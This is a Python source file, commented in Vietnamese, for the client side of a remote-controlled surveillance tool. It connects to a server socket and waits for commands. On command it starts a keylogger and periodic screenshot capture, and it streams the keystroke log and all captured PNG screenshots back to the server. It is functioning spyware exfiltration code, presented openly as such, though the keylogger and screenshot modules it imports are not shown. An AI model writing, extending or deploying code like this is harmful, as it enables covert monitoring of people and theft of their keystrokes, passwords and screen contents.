import socket
import os
import threading

from Functions.keylogger import start_keylogger  
from Functions.keylogger import stop_keylogger
from Functions.screenshot import start_screenshot 
from Functions.screenshot import stop_screenshot 

def handle_request(command, server_socket):
    """Xử lý yêu cầu từ server."""
    if command == "start_keylogger":
        message = "Bắt đầu keylogger..."
        start_keylogger()
    elif command == "start_screenshot":
        message = "Bắt đầu chụp ảnh màn hình..."
        start_screenshot()
    elif command == "stop":
        message = "Dừng tất cả các chức năng."
        stop_keylogger()
        stop_screenshot()
    elif command == "send_log":
        message = "Gửi file log."
        threading.Thread(target=send_file, args=(server_socket, 'logs/log.txt')).start() 
    elif command == "send_screens":
        message = "Gửi ảnh."
        threading.Thread(target=send_screens, args=(server_socket,)).start()
    else:
        message = "Lệnh không hợp lệ."

    # Gửi thông điệp đến server
    server_socket.sendall(message.encode())

def send_file(socket, filepath):
    """Gửi file đến server."""
    try:
        # Gửi thông tin file
        filename = os.path.basename(filepath)
        filesize = os.path.getsize(filepath)
        socket.sendall(f"FILE {filename} {filesize}".encode())
        
        # Gửi nội dung file
        with open(filepath, "rb") as f:
            bytes_sent = 0
            while bytes_sent < filesize:
                bytes_read = f.read(1024)
                if not bytes_read:
                    break
                socket.sendall(bytes_read)
                bytes_sent += len(bytes_read)
                
        print(f"Đã gửi file: {filepath} với kích thước: {filesize} bytes")
    except Exception as e:
        print(f"Đã xảy ra lỗi khi gửi file: {e}")

def send_screens(socket):
    """Gửi tất cả các file ảnh trong thư mục Screens đến server."""
    screens_dir = os.path.join(os.path.dirname(__file__), '..', 'Screens')  # Đường dẫn đến thư mục Screens
    for filename in os.listdir(screens_dir):
        if filename.endswith('.png'):  # Chỉ gửi file PNG
            send_file(socket, os.path.join(screens_dir, filename))

def main():
    # Thiết lập socket
    server_address = ('localhost', 12345)  # Địa chỉ server và cổng
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Kết nối tới server
        client_socket.connect(server_address)
        print("Kết nối tới server thành công.")

        while True:
            # Nhận lệnh từ server
            command = client_socket.recv(1024).decode()  # Đọc lệnh từ server
            if command:
                handle_request(command, client_socket)  # Gọi hàm xử lý yêu cầu

    except Exception as e:
        print(f"Đã xảy ra lỗi: {e}")
    finally:
        client_socket.close()  # Đóng socket khi kết thúc

if __name__ == "__main__":
    main()
